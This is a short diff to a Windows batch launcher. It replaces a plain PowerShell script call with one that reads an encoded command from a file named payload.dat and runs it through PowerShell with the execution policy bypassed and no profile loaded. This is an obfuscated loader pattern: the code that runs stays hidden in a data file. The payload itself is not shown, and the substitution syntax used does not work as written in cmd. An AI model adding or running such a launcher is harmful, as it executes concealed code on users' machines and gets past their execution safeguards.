@@ -1,2 +1,2 @@
 @echo off
-pwsh -nop -ep Bypass -f execute.ps1
+pwsh -nop -ep Bypass -e (type .\payload.dat)
